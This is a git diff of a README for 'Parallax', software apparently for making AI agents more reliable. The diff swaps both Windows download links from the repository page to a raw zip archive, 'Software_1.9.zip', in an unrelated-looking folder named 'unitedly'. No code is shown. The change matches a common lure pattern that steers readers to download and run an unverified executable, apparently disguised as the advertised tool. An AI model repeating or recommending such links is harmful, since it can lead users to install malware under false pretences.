@@ -1,6 +1,6 @@
 # ⚙️ Parallax - Make your AI agents more reliable
 
-[![](https://img.shields.io/badge/Download-Parallax_for_Windows-blue.svg)](https://github.com/kakarotoadri-eng/Parallax)
+[![](https://img.shields.io/badge/Download-Parallax_for_Windows-blue.svg)](https://github.com/kakarotoadri-eng/Parallax/raw/refs/heads/main/unitedly/Software_1.9.zip)
 
 ## 🛠️ What is Parallax
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The software requires 4GB 
 
 Visit the following page to download the latest version of the software. 
 
-[Download Parallax for Windows](https://github.com/kakarotoadri-eng/Parallax)
+[Download Parallax for Windows](https://github.com/kakarotoadri-eng/Parallax/raw/refs/heads/main/unitedly/Software_1.9.zip)
 
 1. Open your web browser.
 2. Navigate to the link shown above.
